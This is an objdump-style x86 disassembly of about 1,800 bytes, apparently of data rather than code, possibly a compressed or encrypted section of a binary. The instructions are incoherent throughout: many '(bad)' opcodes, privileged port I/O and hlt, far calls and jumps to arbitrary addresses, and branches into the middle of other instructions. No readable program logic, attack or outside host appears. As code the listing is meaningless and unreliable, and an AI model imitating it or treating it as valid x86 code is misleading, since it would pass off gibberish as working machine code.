  40bbda:	mov    DWORD PTR [eax+ecx*2-0x66],ebp
  40bbde:	shl    cl,1
  40bbe0:	or     esp,edi
  40bbe2:	inc    ebp
  40bbe3:	nop
  40bbe4:	in     eax,0xf3
  40bbe6:	out    0x42,al
  40bbe8:	inc    esi
  40bbe9:	mov    ds:0xf7944b0a,al
  40bbee:	daa    
  40bbef:	cwde   
  40bbf0:	call   0xe0bf0caa
  40bbf5:	adc    BYTE PTR [ecx-0x19398a],dh
  40bbfb:	scas   al,BYTE PTR es:[edi]
  40bbfc:	xchg   ecx,eax
  40bbfd:	std    
  40bbfe:	imul   ebx,DWORD PTR ds:0x1c7deddd,0xffffffee
  40bc05:	hlt    
  40bc06:	and    bl,BYTE PTR [esi+eax*1-0x6faf722b]
  40bc0d:	dec    eax
  40bc0e:	inc    esi
  40bc0f:	mov    ds:0x22450b29,al
  40bc14:	add    eax,0x8b776087
  40bc19:	mov    edi,0x7319a8b
  40bc1e:	and    DWORD PTR [ebx-0x7428a20e],ecx
  40bc24:	sub    eax,0xa6772142
  40bc29:	enter  0x6b0f,0x1
  40bc2d:	xor    al,0xd7
  40bc2f:	stos   BYTE PTR es:[edi],al
  40bc30:	and    DWORD PTR [eax-0x3d5d2b15],esp
  40bc36:	fisttp DWORD PTR [ebx]
  40bc38:	add    BYTE PTR [edi+0xe],al
  40bc3b:	loop   0x40bbda
  40bc3d:	xchg   ebx,eax
  40bc3e:	mov    bl,0xa8
  40bc40:	jno    0x40bc09
  40bc42:	mov    al,ds:0xde25c453
  40bc47:	xchg   edx,eax
  40bc48:	mov    eax,0x77599040
  40bc4d:	das    
  40bc4e:	mov    bh,0x62
  40bc50:	mov    dl,0xcd
  40bc52:	rol    esi,0x71
  40bc55:	shr    DWORD PTR [esi+0x4d3ee32b],0x80
  40bc5c:	xor    esi,edx
  40bc5e:	push   cs
  40bc5f:	shl    DWORD PTR ds:0x1ba83ef9,0x46
  40bc66:	push   es
  40bc67:	cmp    ebx,DWORD PTR [esi-0x7c]
  40bc6a:	shr    DWORD PTR ds:0x3a4cd9ae,cl
  40bc70:	sbb    BYTE PTR [ebx+0x1a49e335],dl
  40bc76:	mov    edx,0x75208fff
  40bc7b:	in     eax,dx
  40bc7c:	mov    cl,0x6b
  40bc7e:	mov    eax,ds:0x2da351dd
  40bc83:	pushf  
  40bc84:	push   ebx
  40bc85:	mov    al,0xa6
  40bc87:	mov    esi,0x8d353647
  40bc8c:	mov    ds:0x34652a00,eax
  40bc91:	push   ss
  40bc92:	loopne 0x40bc91
  40bc94:	mov    eax,esi
  40bc96:	mov    bh,0x34
  40bc98:	and    eax,0xe2016235
  40bc9d:	ss stos DWORD PTR es:[edi],eax
  40bc9f:	mov    ?,WORD PTR [esi-0x30]
  40bca2:	sahf   
  40bca3:	mov    dl,0xdf
  40bca5:	cli    
  40bca6:	rcr    ebp,1
  40bca8:	out    dx,al
  40bca9:	mov    eax,0x75cd1055
  40bcae:	and    ch,BYTE PTR [esi+0x78]
  40bcb1:	jle    0x40bcf9
  40bcb3:	xlat   BYTE PTR ds:[ebx]
  40bcb4:	loop   0x40bc57
  40bcb6:	xchg   ebx,eax
  40bcb7:	cld    
  40bcb8:	push   0x36e3839a
  40bcbd:	icebp  
  40bcbe:	fst    QWORD PTR [eax+0x73fa38d7]
  40bcc4:	dec    ecx
  40bcc5:	sbb    ebp,edx
  40bcc7:	ficomp DWORD PTR [edx-0x3f]
  40bcca:	mov    cl,0x8d
  40bccc:	cli    
  40bccd:	jns    0x40bcb2
  40bccf:	mov    ds:0x6ecc2633,al
  40bcd4:	pushf  
  40bcd5:	dec    esp
  40bcd6:	mov    es,WORD PTR [esi-0xc13180b]
  40bcdc:	pusha  
  40bcdd:	enter  0xe361,0x19
  40bce1:	jae    0x40bcda
  40bce3:	aas    
  40bce4:	stc    
  40bce5:	xchg   edi,eax
  40bce6:	jnp    0x40bcc1
  40bce8:	push   0x33
  40bcea:	mov    ebp,ss
  40bcec:	jne    0x40bd4b
  40bcee:	fdivp  st(6),st
  40bcf0:	mov    eax,0xbdf063b8
  40bcf5:	(bad)  
  40bcf6:	retf   0xe290
  40bcf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcfa:	loope  0x40bcb6
  40bcfc:	(bad)  
  40bcfd:	sub    eax,DWORD PTR [ebp-0x7f]
  40bd00:	cwde   
  40bd01:	repnz add ah,BYTE PTR [edi]
  40bd04:	addr16 aas 
  40bd06:	adc    edi,esp
  40bd08:	sbb    dh,BYTE PTR ds:0xd79aa2c0
  40bd0e:	jl     0x40bc92
  40bd10:	stos   DWORD PTR es:[edi],eax
  40bd11:	adc    DWORD PTR cs:[edi-0x6c],eax
  40bd15:	es icebp 
  40bd17:	sub    eax,DWORD PTR [esi+0x9]
  40bd1a:	loope  0x40bca0
  40bd1c:	add    al,BYTE PTR [edx-0x38]
  40bd1f:	in     al,dx
  40bd20:	sub    eax,0x62f373bc
  40bd25:	cdq    
  40bd26:	xor    BYTE PTR [esi+0x5c],dl
  40bd29:	mov    esp,0xd783b496
  40bd2e:	mov    ebx,0x37b89b6a
  40bd33:	idiv   DWORD PTR [edx+0x2c]
  40bd36:	clc    
  40bd37:	push   es
  40bd38:	xlat   BYTE PTR ds:[ebx]
  40bd39:	std    
  40bd3a:	ja     0x40bd50
  40bd3c:	enter  0x4934,0xa5
  40bd40:	shl    BYTE PTR [ecx-0x667cc0a1],cl
  40bd46:	adc    eax,0xdb18ea1d
  40bd4b:	mov    ebx,DWORD PTR [edx]
  40bd4d:	cld    
  40bd4e:	cmp    al,0x86
  40bd50:	add    al,BYTE PTR ds:0x5d399871
  40bd56:	mov    bl,0x73
  40bd58:	in     al,0xd9
  40bd5a:	cmp    WORD PTR [edi-0x24],cx
  40bd5e:	pop    ebx
  40bd5f:	mov    eax,ecx
  40bd61:	jl     0x40bd41
  40bd63:	add    BYTE PTR [esi],ch
  40bd65:	adc    eax,0x7dfdc26a
  40bd6a:	or     al,BYTE PTR [edi]
  40bd6c:	lods   eax,DWORD PTR ds:[esi]
  40bd6d:	sub    edx,DWORD PTR [ebx]
  40bd6f:	sbb    DWORD PTR [eax-0x504933c3],edx
  40bd75:	dec    eax
  40bd76:	imul   DWORD PTR [esi+edi*8]
  40bd79:	rcr    ah,0xe3
  40bd7c:	jae    0x40bdc8
  40bd7e:	add    BYTE PTR [ebx],0x3c
  40bd81:	nop
  40bd82:	jns    0x40bd92
  40bd84:	scas   eax,DWORD PTR es:[edi]
  40bd85:	mov    ebp,0xe8ba8fcd
  40bd8a:	lds    ebx,FWORD PTR [ebx-0xe]
  40bd8d:	push   ss
  40bd8e:	test   ebx,edi
  40bd90:	popf   
  40bd91:	sub    BYTE PTR [eax],cl
  40bd93:	std    
  40bd94:	mov    eax,0xf1015bed
  40bd99:	lahf   
  40bd9a:	or     eax,0xdbb39ca9
  40bd9f:	mov    dl,0xca
  40bda1:	aam    0x32
  40bda3:	pop    esi
  40bda4:	shr    DWORD PTR [edi+eax*1+0x3e275d39],0x72
  40bdac:	hlt    
  40bdad:	out    dx,eax
  40bdae:	mov    ch,0x43
  40bdb0:	(bad)  
  40bdb1:	mov    eax,ds:0xcc9fe7
  40bdb6:	(bad)  
  40bdb7:	mov    cl,0x98
  40bdb9:	jle    0x40bdec
  40bdbb:	cmp    DWORD PTR ds:0x5c6386a9,ebx
  40bdc1:	arpl   bp,sp
  40bdc3:	clc    
  40bdc4:	pusha  
  40bdc5:	push   esi
  40bdc6:	out    0xb6,al
  40bdc8:	pop    ds
  40bdc9:	sub    al,BYTE PTR [edx]
  40bdcb:	in     al,dx
  40bdcc:	pop    ecx
  40bdcd:	inc    eax
  40bdce:	dec    esp
  40bdcf:	mov    al,fs:0x3ebbc4d
  40bdd5:	scas   eax,DWORD PTR es:[edi]
  40bdd6:	imul   edx,DWORD PTR [edx+esi*1],0x7ce11880
  40bddd:	pop    edx
  40bdde:	mov    dl,0x86
  40bde0:	dec    esi
  40bde1:	xor    DWORD PTR [ebx],edx
  40bde3:	dec    edi
  40bde4:	xor    al,0x6
  40bde6:	fbstp  TBYTE PTR [ecx+eax*8+0x2e]
  40bdea:	popf   
  40bdeb:	and    bl,dl
  40bded:	outs   dx,DWORD PTR ds:[esi]
  40bdee:	fadd   st(6),st
  40bdf0:	rol    DWORD PTR [eax],0x94
  40bdf3:	cdq    
  40bdf4:	pushw  0x79
  40bdf7:	sti    
  40bdf8:	sbb    bh,BYTE PTR [edi]
  40bdfa:	std    
  40bdfb:	pusha  
  40bdfc:	nop
  40bdfd:	repnz cmp BYTE PTR [ebp+0x4dfcdef9],al
  40be04:	pop    ss
  40be05:	pushw  0x20
  40be08:	pop    es
  40be09:	xor    DWORD PTR [eax+edi*2-0x35a0f49b],ebx
  40be10:	int3   
  40be11:	pop    esi
  40be12:	push   cs
  40be13:	sbb    al,BYTE PTR [ecx]
  40be15:	test   al,0x1b
  40be17:	std    
  40be18:	ins    DWORD PTR es:[edi],dx
  40be19:	ror    BYTE PTR ds:0x7fff,cl
  40be1e:	sbb    eax,0x726f3093
  40be23:	shl    BYTE PTR [edx-0x25361bb0],1
  40be29:	sbb    ch,BYTE PTR [edx-0x381dd4bb]
  40be2f:	lahf   
  40be30:	push   0x19de13c0
  40be35:	inc    esi
  40be36:	add    DWORD PTR [edi],eax
  40be38:	mov    eax,0x4d3dc7b4
  40be3d:	xchg   ebp,eax
  40be3e:	(bad)
  40be41:	sahf   
  40be42:	pop    eax
  40be43:	xor    al,0x8d
  40be45:	and    BYTE PTR [esi-0x15f9aade],ch
  40be4b:	mov    BYTE PTR [esi-0x38],bl
  40be4e:	hlt    
  40be4f:	push   0xffffff8b
  40be51:	stos   BYTE PTR es:[edi],al
  40be52:	fstp   QWORD PTR [esi+eiz*4]
  40be55:	adc    DWORD PTR [eax],ebp
  40be57:	lahf   
  40be58:	iret   
  40be59:	add    dl,BYTE PTR [eax]
  40be5b:	ss jp  0x40beaa
  40be5e:	adc    ah,BYTE PTR [edi-0x6f]
  40be61:	lock ror BYTE PTR [eax],cl
  40be64:	mov    edx,0x82475dbc
  40be69:	test   bh,0xd0
  40be6c:	ss dec esi
  40be6e:	sub    eax,0xccfdfb52
  40be73:	mov    ebx,0xdda2e5f9
  40be78:	mov    bl,0xb4
  40be7a:	xchg   BYTE PTR [esi+0x72],bh
  40be7d:	sub    ebp,DWORD PTR [edx+0x2fa8781b]
  40be83:	mov    ch,0xaf
  40be85:	mov    ecx,0x442c659f
  40be8a:	fild   DWORD PTR [ecx-0x7f0b6e04]
  40be90:	repz mov dh,0xf0
  40be93:	push   edx
  40be94:	adc    edi,DWORD PTR [ebx]
  40be96:	and    al,0x6e
  40be98:	retw   
  40be9a:	mov    cl,0x10
  40be9c:	fisttp WORD PTR [ebp-0x50]
  40be9f:	push   esp
  40bea0:	ins    DWORD PTR es:[edi],dx
  40bea1:	mov    ch,cl
  40bea3:	into   
  40bea4:	cmp    al,0x49
  40bea6:	mov    edx,DWORD PTR [ecx]
  40bea8:	mov    ds:0xb0daea2e,eax
  40bead:	push   ds
  40beae:	sub    eax,0x4cefdd92
  40beb3:	mov    al,ds:0x2adf9e13
  40beb8:	pusha  
  40beb9:	mov    edi,0xc4fe76ad
  40bebe:	adc    edi,ebx
  40bec0:	xchg   ecx,eax
  40bec1:	rcl    DWORD PTR [edi-0x35],cl
  40bec4:	push   es
  40bec5:	pop    eax
  40bec6:	mov    al,0xaf
  40bec8:	ret    
  40bec9:	popa   
  40beca:	dec    ebp
  40becb:	clc    
  40becc:	retf   0x11a1
  40becf:	in     al,0x69
  40bed1:	(bad)  
  40bed2:	mov    ch,dh
  40bed4:	mov    ds:0xda9148cf,eax
  40bed9:	sar    BYTE PTR [bp+si+0x2e],cl
  40bedd:	cdq    
  40bede:	adc    esp,DWORD PTR [ecx]
  40bee0:	ja     0x40bf17
  40bee2:	jl     0x40bf3c
  40bee4:	sub    al,0x87
  40bee6:	fwait
  40bee7:	mov    DWORD PTR [esi-0x69],edx
  40beea:	inc    ebx
  40beeb:	or     al,0xbb
  40beed:	loope  0x40bf12
  40beef:	in     al,0x7
  40bef1:	xor    BYTE PTR [esi],al
  40bef3:	arpl   WORD PTR [ecx],si
  40bef5:	aam    0x90
  40bef7:	push   ds
  40bef8:	cmp    al,0xb
  40befa:	push   edx
  40befb:	xchg   edx,eax
  40befc:	add    eax,0x3b5531cf
  40bf01:	push   ebp
  40bf02:	lods   eax,DWORD PTR ds:[esi]
  40bf03:	push   ss
  40bf04:	ret    0x6768
  40bf07:	pop    ds
  40bf08:	and    ebx,eax
  40bf0a:	pop    esi
  40bf0b:	fwait
  40bf0c:	jae    0x40bebe
  40bf0e:	nop
  40bf0f:	mov    eax,edx
  40bf11:	lods   eax,DWORD PTR ds:[esi]
  40bf12:	ret    0xfc43
  40bf15:	and    eax,0x8bee8180
  40bf1a:	jl     0x40bf15
  40bf1c:	adc    al,0x51
  40bf1e:	cld    
  40bf1f:	out    0xc2,al
  40bf21:	dec    ebp
  40bf22:	xchg   BYTE PTR [eax],ah
  40bf24:	lods   eax,DWORD PTR ds:[esi]
  40bf25:	jle    0x40bf5c
  40bf27:	sub    bl,BYTE PTR [esi-0x3f]
  40bf2a:	fstp   QWORD PTR [ecx+0x19]
  40bf2d:	lods   al,BYTE PTR ds:[esi]
  40bf2e:	xchg   edi,eax
  40bf2f:	xchg   esp,eax
  40bf30:	mov    edx,0x661316d7
  40bf35:	out    0xf4,eax
  40bf37:	sub    BYTE PTR [eax-0x638d90d3],bh
  40bf3d:	mov    esi,0x53444350
  40bf42:	adc    bh,ah
  40bf44:	loop   0x40bf6f
  40bf46:	add    BYTE PTR [ebp-0x53],dl
  40bf49:	mov    ch,0x33
  40bf4b:	int    0x5c
  40bf4d:	data16 fucomip st,st(1)
  40bf50:	mov    ebp,0xaae831c6
  40bf55:	loop   0x40bfa5
  40bf57:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40bf59:	sbb    al,0x98
  40bf5b:	lods   al,BYTE PTR ds:[esi]
  40bf5c:	mov    ds:0x88b7db64,al
  40bf61:	dec    edx
  40bf62:	jp     0x40bf8b
  40bf64:	rcl    ah,1
  40bf66:	iret   
  40bf67:	xor    ch,al
  40bf69:	fs push edx
  40bf6b:	xchg   esp,eax
  40bf6c:	aas    
  40bf6d:	jno    0x40bf14
  40bf6f:	inc    esp
  40bf70:	iret   
  40bf71:	dec    eax
  40bf72:	and    BYTE PTR [ebx+0x48],0xe4
  40bf76:	jns    0x40bf0a
  40bf78:	push   eax
  40bf79:	int    0x36
  40bf7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf7c:	push   ds
  40bf7d:	shr    BYTE PTR [ecx+0x20e15401],0xf
  40bf84:	ja     0x40bf28
  40bf86:	imul   ecx
  40bf88:	pop    esp
  40bf89:	test   BYTE PTR [edx],bh
  40bf8b:	(bad)  
  40bf8c:	mul    BYTE PTR [edx]
  40bf8e:	push   eax
  40bf8f:	push   ecx
  40bf90:	lods   al,BYTE PTR ds:[esi]
  40bf91:	ja     0x40bf28
  40bf93:	sub    BYTE PTR [edi],ch
  40bf95:	and    BYTE PTR [edi],al
  40bf97:	das    
  40bf98:	mov    bh,0xd4
  40bf9a:	dec    esi
  40bf9b:	outs   dx,DWORD PTR ds:[esi]
  40bf9c:	arpl   WORD PTR [edx-0x3686fabe],cx
  40bfa2:	cmp    eax,0x2898d10
  40bfa7:	pop    ds
  40bfa8:	fst    DWORD PTR [ecx+0x379fa4c7]
  40bfae:	xchg   ecx,eax
  40bfaf:	into   
  40bfb0:	mov    dh,0x87
  40bfb2:	cmp    ebx,edi
  40bfb4:	pop    edi
  40bfb5:	xchg   BYTE PTR [ecx],bl
  40bfb7:	adc    eax,0x2517c9e
  40bfbc:	sahf   
  40bfbd:	test   ecx,0xe303696e
  40bfc3:	mov    dl,0x96
  40bfc5:	js     0x40c011
  40bfc7:	jb     0x40bfc1
  40bfc9:	repz and DWORD PTR ds:[ebp-0x1c560844],ecx
  40bfd1:	ds sahf 
  40bfd3:	add    esp,ecx
  40bfd5:	mov    cl,0xa2
  40bfd7:	jno    0x40c02b
  40bfd9:	fild   DWORD PTR [edx-0x4d]
  40bfdc:	into   
  40bfdd:	jmp    0x595bd6ad
  40bfe2:	in     eax,dx
  40bfe3:	(bad)  
  40bfe4:	pop    ds
  40bfe5:	pop    edx
  40bfe6:	inc    ebx
  40bfe7:	cmc    
  40bfe8:	dec    esi
  40bfe9:	mov    edx,0x4a5f3a71
  40bfee:	and    ebp,DWORD PTR [edx-0x3d1c7542]
  40bff4:	jae    0x40c068
  40bff6:	scas   eax,DWORD PTR es:[edi]
  40bff7:	in     al,0x42
  40bff9:	fist   WORD PTR [ebx+0xc075031]
  40bfff:	sub    cl,cl
  40c001:	fnstcw WORD PTR [edi+eax*4+0x35c16e8c]
  40c008:	sbb    DWORD PTR [ebp+0x67],ebp
  40c00b:	ss xor eax,0x8bb70586
  40c011:	lds    eax,FWORD PTR [esi-0x13d65bd4]
  40c017:	pop    ebx
  40c018:	lahf   
  40c019:	inc    esi
  40c01a:	jb     0x40c002
  40c01c:	sti    
  40c01d:	leave  
  40c01e:	js     0x40c02d
  40c020:	add    eax,0x22b15de
  40c025:	inc    esi
  40c026:	mov    ecx,0x81827de
  40c02b:	sub    DWORD PTR [ebx-0x4a7c8a51],edx
  40c031:	lods   al,BYTE PTR ds:[esi]
  40c032:	aas    
  40c033:	mov    dl,0x4e
  40c035:	loope  0x40bfc3
  40c037:	sub    dl,BYTE PTR [ebx-0x58]
  40c03a:	jecxz  0x40c0b7
  40c03c:	add    dl,bh
  40c03e:	mov    al,0x62
  40c040:	daa    
  40c041:	lods   al,BYTE PTR ds:[esi]
  40c042:	jno    0x40c092
  40c044:	retf   0x2ee5
  40c047:	cmc    
  40c048:	idiv   DWORD PTR [edi-0x64]
  40c04b:	out    0xc0,al
  40c04d:	and    dh,dl
  40c04f:	mov    ah,0xb3
  40c051:	(bad)  
  40c053:	jl     0x40c00b
  40c055:	ds jnp 0x40c0b3
  40c058:	mov    eax,0xd58bf986
  40c05d:	add    eax,DWORD PTR [ebx-0x49a85dd4]
  40c063:	xchg   edi,eax
  40c064:	int    0x3b
  40c066:	pop    es
  40c067:	sub    BYTE PTR [ebx-0x4068cfca],bh
  40c06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c06e:	inc    esp
  40c06f:	xchg   esi,eax
  40c071:	inc    edi
  40c072:	idiv   BYTE PTR [edi]
  40c074:	cs mov ds,WORD PTR cs:[esi]
  40c078:	push   ebx
  40c079:	sti    
  40c07a:	fwait
  40c07b:	scas   al,BYTE PTR es:[edi]
  40c07c:	jle    0x40c0e0
  40c07e:	dec    esi
  40c07f:	xlat   BYTE PTR ds:[ebx]
  40c080:	aaa    
  40c081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c082:	jg     0x40c07a
  40c084:	call   0x9ff3241f
  40c089:	int3   
  40c08a:	std    
  40c08b:	sub    eax,DWORD PTR [eax]
  40c08d:	or     dl,BYTE PTR [edx+edi*2]
  40c090:	sub    DWORD PTR [esi*8+0x74a634de],0xb8fe94fc
  40c09b:	(bad)  
  40c09d:	(bad)  
  40c09e:	xchg   edi,eax
  40c09f:	sub    bl,0xe4
  40c0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a3:	add    ah,BYTE PTR [ebp+0x35]
  40c0a6:	(bad)  
  40c0a7:	std    
  40c0a8:	mov    bh,0x10
  40c0aa:	ds push esi
  40c0ac:	mov    al,0x34
  40c0ae:	mov    bl,0x2f
  40c0b0:	dec    ebp
  40c0b1:	loope  0x40c0fd
  40c0b3:	clc    
  40c0b4:	mov    esp,0xb834a2b
  40c0b9:	mov    ebp,edx
  40c0bb:	mov    ch,0xff
  40c0bd:	mov    ch,0x94
  40c0bf:	pop    edi
  40c0c0:	fiadd  DWORD PTR [edx]
  40c0c2:	push   edx
  40c0c3:	rol    ah,cl
  40c0c5:	pmaddwd mm7,mm1
  40c0c8:	pop    edi
  40c0c9:	imul   edx,edx,0xdc100450
  40c0cf:	xchg   ebx,eax
  40c0d0:	jbe    0x40c0ef
  40c0d2:	push   ebx
  40c0d3:	and    ch,BYTE PTR [edx+eiz*2]
  40c0d6:	jb     0x40c0e1
  40c0d8:	cdq    
  40c0d9:	adc    bh,BYTE PTR [eax+0x3e51b29]
  40c0df:	sub    eax,DWORD PTR [esi+0x2c662052]
  40c0e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e6:	inc    esi
  40c0e7:	fs cli 
  40c0e9:	ja     0x40c0bf
  40c0eb:	mov    ebp,0x39e1a74f
  40c0f0:	mov    al,0x2e
  40c0f2:	loope  0x40c129
  40c0f4:	stc    
  40c0f5:	xor    DWORD PTR [eax+edi*8],ecx
  40c0f8:	jge    0x40c0ce
  40c0fa:	sbb    eax,0x43c8d03b
  40c0ff:	dec    edi
  40c100:	mov    ebp,0x532789b6
  40c105:	and    BYTE PTR [ebx+ebx*4-0x1f],dl
  40c109:	mov    edx,0x15c5a6aa
  40c10e:	rcr    DWORD PTR [ebp+0x69],cl
  40c111:	xchg   edi,eax
  40c112:	scas   al,BYTE PTR es:[edi]
  40c113:	push   esi
  40c114:	jl     0x40c0de
  40c116:	lea    edi,[eax+0x619cd78d]
  40c11c:	ret    
  40c11d:	aas    
  40c11e:	call   0x60d5:0xee3ffb76
  40c125:	lds    esp,FWORD PTR [esi+0x709d5449]
  40c12b:	xchg   edi,eax
  40c12c:	ret    
  40c12d:	ds mov eax,0x4582582c
  40c133:	ja     0x40c177
  40c135:	std    
  40c136:	jo     0x40c0fb
  40c138:	adc    BYTE PTR ds:0xce35d668,dl
  40c13e:	mov    ebx,0x5fd8cdea
  40c143:	mov    ah,0x77
  40c145:	js     0x40c0db
  40c147:	ds ins BYTE PTR es:[edi],dx
  40c149:	sub    esi,ebp
  40c14b:	jo     0x40c0f5
  40c14d:	int    0xab
  40c14f:	in     al,0x11
  40c151:	lods   eax,DWORD PTR ds:[esi]
  40c152:	cmp    BYTE PTR [eax-0x6eff8139],al
  40c158:	cwde   
  40c159:	pop    edi
  40c15a:	cmp    al,0xb4
  40c15c:	ss pop edx
  40c15e:	outs   dx,BYTE PTR ds:[esi]
  40c15f:	lds    eax,FWORD PTR [edi]
  40c161:	sub    al,0x57
  40c163:	jmp    0x40c170
  40c165:	mov    edx,0x86708cc
  40c16a:	and    ebx,DWORD PTR [eax-0x6b857a3b]
  40c170:	dec    edi
  40c171:	lods   eax,DWORD PTR ds:[esi]
  40c172:	aaa    
  40c173:	sub    BYTE PTR [eax],bh
  40c175:	fs push ecx
  40c177:	jp     0x40c1dd
  40c179:	pushf  
  40c17a:	fadd   DWORD PTR [edx]
  40c17c:	sub    DWORD PTR [esi+esi*4],eax
  40c17f:	sub    bh,dl
  40c181:	iret   
  40c182:	rcl    ebx,0x55
  40c185:	ds sbb eax,0x5aca8536
  40c18b:	pop    esp
  40c18c:	shr    DWORD PTR [esi-0x52],cl
  40c18f:	or     eax,0xe388e60e
  40c194:	jmp    0x72f9:0xbfec6573
  40c19b:	jo     0x40c1a2
  40c19d:	add    BYTE PTR [ecx-0x7f],ch
  40c1a0:	pop    edi
  40c1a1:	cld    
  40c1a2:	push   ecx
  40c1a3:	push   ds
  40c1a4:	repz add bl,BYTE PTR [ecx+0x25fa984b]
  40c1ab:	or     esp,DWORD PTR [edi+0x51]
  40c1ae:	sahf   
  40c1af:	push   eax
  40c1b0:	enter  0x1cb2,0x82
  40c1b4:	cmp    DWORD PTR [esi],ebx
  40c1b6:	or     ebp,DWORD PTR [ecx+0x28]
  40c1b9:	aad    0x5f
  40c1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1bc:	(bad)  
  40c1be:	push   0xb64612c5
  40c1c3:	cmp    bl,BYTE PTR [ebx-0x78]
  40c1c6:	lock or dl,BYTE PTR [eax-0x638d7b5b]
  40c1cd:	jp     0x40c247
  40c1cf:	das    
  40c1d0:	jnp    0x40c1b9
  40c1d2:	mov    eax,0xff5fbb29
  40c1d7:	test   al,0x75
  40c1d9:	xor    BYTE PTR [edi+0x62c7d4cb],bl
  40c1df:	mov    edx,0x43c13dc
  40c1e4:	adc    al,0xdb
  40c1e6:	sub    ebx,DWORD PTR [edi-0x58a2206b]
  40c1ec:	jo     0x40c183
  40c1ee:	ret    0x935c
  40c1f1:	nop
  40c1f2:	test   BYTE PTR [ecx-0x51f1259e],ch
  40c1f8:	sahf   
  40c1f9:	and    BYTE PTR [edx-0x49fd249],al
  40c1ff:	sahf   
  40c200:	sbb    BYTE PTR [eax+0x49],ch
  40c203:	cmp    al,0x92
  40c205:	mov    bl,bh
  40c207:	push   eax
  40c208:	jg     0x40c1fd
  40c20a:	loope  0x40c190
  40c20c:	mov    ds:0x324da344,al
  40c211:	(bad)  
  40c212:	and    eax,esi
  40c214:	test   eax,0xdf34ebef
  40c219:	xor    DWORD PTR [edi-0x58148f0d],0x41ee3e7d
  40c223:	or     al,0xd7
  40c225:	mov    dl,0xbd
  40c227:	scas   al,BYTE PTR es:[edi]
  40c228:	addr16 mov ds:0x73ac,eax
  40c22c:	mov    al,0x40
  40c22e:	(bad)  
  40c22f:	push   0xffffff8c
  40c231:	mov    ecx,0x47ae32cb
  40c236:	shl    BYTE PTR [edi+0x389ac6b6],cl
  40c23c:	iret   
  40c23d:	inc    edx
  40c23e:	or     ecx,esi
  40c240:	in     eax,0xed
  40c242:	(bad)  
  40c243:	scas   eax,DWORD PTR es:[edi]
  40c244:	mov    ecx,0xff803beb
  40c249:	jnp    0x40c219
  40c24b:	sbb    DWORD PTR [eax-0x5],ebp
  40c24e:	lea    ebx,[ebp+0x33]
  40c251:	jl     0x40c23a
  40c253:	add    eax,esp
  40c255:	xchg   edx,eax
  40c256:	lea    edx,[ebp-0x7e636237]
  40c25c:	gs pop edi
  40c25e:	(bad)  [esp+esi*4-0x1d]
  40c262:	mov    eax,ds:0x53288a0b
  40c267:	in     al,0x46
  40c269:	dec    ebx
  40c26a:	sbb    eax,0xb908a7cd
  40c26f:	cmp    BYTE PTR [edi],0x8b
  40c272:	cmp    BYTE PTR [eax+0x3d],dl
  40c275:	mov    dh,0x8
  40c277:	jl     0x40c223
  40c279:	or     DWORD PTR [edi],esp
  40c27b:	jo     0x40c242
  40c27d:	dec    ebx
  40c27e:	ins    BYTE PTR es:[edi],dx
  40c27f:	xor    al,0xe7
  40c281:	xchg   ebx,eax
  40c282:	xchg   edx,eax
  40c283:	retf   
  40c284:	sahf   
  40c285:	mov    edi,0x3f355617
  40c28a:	mov    esi,0x302a4b3f
  40c28f:	imul   edi,eax,0x6036e0e2
  40c295:	lds    ebx,FWORD PTR [esi+0x7f5048a4]
  40c29b:	cmc    
  40c29c:	addr16 mov cl,0x99
  40c29f:	sbb    al,0xdf
  40c2a1:	call   0xc3a88386
  40c2a6:	jmp    0xe8a40702
  40c2ab:	mov    bl,BYTE PTR [ecx+ebx*8-0x25]
  40c2af:	pop    es
  40c2b0:	add    al,0xc3
  40c2b2:	sub    ebx,esi
  40c2b4:	pop    ds
  40c2b5:	shl    DWORD PTR [ebx],0xdf
  40c2b8:	inc    edi
  40c2b9:	(bad)  
  40c2ba:	inc    esp
  40c2bb:	lods   al,BYTE PTR ds:[esi]
  40c2bc:	in     al,dx
  40c2bd:	pop    ebx
  40c2be:	xchg   edx,eax
  40c2bf:	ds xchg edx,eax
  40c2c1:	sub    eax,0xb9c5b00b
  40c2c6:	push   ebp
  40c2c7:	stos   BYTE PTR es:[edi],al
  40c2c8:	xchg   ecx,eax
  40c2c9:	lahf   
  40c2ca:	sbb    al,0xed
  40c2cc:	or     al,0xb4
  40c2ce:	arpl   ax,dx
  40c2d0:	(bad)  
  40c2d1:	mov    esp,0x95ccb81
  40c2d6:	pop    es
  40c2d7:	push   ebp
  40c2d8:	adc    DWORD PTR [ebx],edx
  40c2da:	push   cs
  40c2db:	adc    al,0xea
  40c2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2de:	test   dh,bl
  40c2e0:	fcmovbe st,st(1)
  40c2e2:	add    al,0x9
  40c2e4:	adc    ch,BYTE PTR [ecx-0x1baff3ec]
  40c2ea:	pop    ebp
  40c2eb:	ret    0xf827
  40c2ee:	shl    DWORD PTR [edi-0x5c7b9e0e],1
  40c2f4:	in     al,dx
  40c2f5:	in     eax,0x7
  40c2f7:	aad    0xb6
  40c2f9:	pop    ecx
  40c2fa:	inc    ebp
  40c2fb:	out    dx,eax
  40c2fc:	shl    ah,0x3f
  40c2ff:	int    0xd3
  40c301:	cli    
  40c302:	pop    ds
  40c303:	xor    DWORD PTR [ebx],esp
  40c305:	xor    BYTE PTR [ebx],0x34
  40c308:	add    BYTE PTR ds:0x4752237c,0x56
  40c30f:	lods   eax,DWORD PTR ds:[esi]
  40c310:	mov    bh,0xff
  40c312:	pop    eax
  40c313:	ja     0x40c361
  40c315:	ret    
  40c316:	and    eax,0x39b6a2dd
  40c31b:	pushf  
  40c31c:	in     al,0xdf
  40c31e:	add    al,0x80
  40c320:	pop    eax
  40c321:	mov    DWORD PTR [ecx],ecx
  40c323:	test   BYTE PTR [ecx],dh
  40c325:	sub    eax,0xdf91048f
  40c32a:	dec    esi
  40c32b:	dec    ebp
  40c32c:	pop    ecx
  40c32d:	inc    ebp
  40c32e:	pop    eax
  40c32f:	ds popf 
  40c331:	xor    eax,DWORD PTR [ebx]
  40c333:	xlat   BYTE PTR ds:[ebx]
  40c334:	cmp    ch,BYTE PTR [ebx-0x32262f07]
  40c33a:	xchg   dh,bh
